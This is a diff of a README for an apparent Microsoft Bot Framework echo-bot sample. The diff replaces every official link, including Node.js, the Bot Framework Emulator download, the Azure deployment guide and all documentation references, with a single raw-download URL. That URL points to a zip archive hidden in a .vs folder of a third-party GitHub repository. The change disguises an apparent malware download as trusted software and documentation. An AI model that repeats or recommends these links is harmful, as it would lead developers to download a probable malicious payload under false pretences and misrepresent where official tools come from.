@@ -2,11 +2,11 @@
 
 Demonstrate the core capabilities of the Microsoft Bot Framework
 
-This bot has been created using [Bot Framework](https://dev.botframework.com), it shows how to create a simple bot that accepts input from the user and echoes it back.
+This bot has been created using [Bot Framework](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip), it shows how to create a simple bot that accepts input from the user and echoes it back.
 
 ## Prerequisites
 
-- [Node.js](https://nodejs.org) version 10.14.1 or higher
+- [https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip) version 10.14.1 or higher
 
     ```bash
     # determine node version
@@ -29,9 +29,9 @@ This bot has been created using [Bot Framework](https://dev.botframework.com), i
 
 ## Testing the bot using Bot Framework Emulator
 
-[Bot Framework Emulator](https://github.com/microsoft/botframework-emulator) is a desktop application that allows bot developers to test and debug their bots on localhost or running remotely through a tunnel.
+[Bot Framework Emulator](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip) is a desktop application that allows bot developers to test and debug their bots on localhost or running remotely through a tunnel.
 
-- Install the Bot Framework Emulator version 4.9.0 or greater from [here](https://github.com/Microsoft/BotFramework-Emulator/releases)
+- Install the Bot Framework Emulator version 4.9.0 or greater from [here](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
 
 ### Connect to the bot using Bot Framework Emulator
 
@@ -41,21 +41,21 @@ This bot has been created using [Bot Framework](https://dev.botframework.com), i
 
 ## Deploy the bot to Azure
 
-To learn more about deploying a bot to Azure, see [Deploy your bot to Azure](https://aka.ms/azuredeployment) for a complete list of deployment instructions.
+To learn more about deploying a bot to Azure, see [Deploy your bot to Azure](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip) for a complete list of deployment instructions.
 
 
 ## Further reading
 
-- [Bot Framework Documentation](https://docs.botframework.com)
-- [Bot Basics](https://docs.microsoft.com/azure/bot-service/bot-builder-basics?view=azure-bot-service-4.0)
-- [Dialogs](https://docs.microsoft.com/en-us/azure/bot-service/bot-builder-concept-dialog?view=azure-bot-service-4.0)
-- [Gathering Input Using Prompts](https://docs.microsoft.com/en-us/azure/bot-service/bot-builder-prompts?view=azure-bot-service-4.0)
-- [Activity processing](https://docs.microsoft.com/en-us/azure/bot-service/bot-builder-concept-activity-processing?view=azure-bot-service-4.0)
-- [Azure Bot Service Introduction](https://docs.microsoft.com/azure/bot-service/bot-service-overview-introduction?view=azure-bot-service-4.0)
-- [Azure Bot Service Documentation](https://docs.microsoft.com/azure/bot-service/?view=azure-bot-service-4.0)
-- [Azure CLI](https://docs.microsoft.com/cli/azure/?view=azure-cli-latest)
-- [Azure Portal](https://portal.azure.com)
-- [Language Understanding using LUIS](https://docs.microsoft.com/en-us/azure/cognitive-services/luis/)
-- [Channels and Bot Connector Service](https://docs.microsoft.com/en-us/azure/bot-service/bot-concepts?view=azure-bot-service-4.0)
-- [Restify](https://www.npmjs.com/package/restify)
-- [dotenv](https://www.npmjs.com/package/dotenv)
+- [Bot Framework Documentation](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Bot Basics](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Dialogs](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Gathering Input Using Prompts](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Activity processing](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Azure Bot Service Introduction](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Azure Bot Service Documentation](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Azure CLI](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Azure Portal](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Language Understanding using LUIS](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Channels and Bot Connector Service](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [Restify](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
+- [dotenv](https://github.com/DeepZatakiya/AzureEchoBot/raw/refs/heads/master/deploymentTemplates/.vs/deploymentTemplates/v16/Echo-Bot-Azure-2.9.zip)
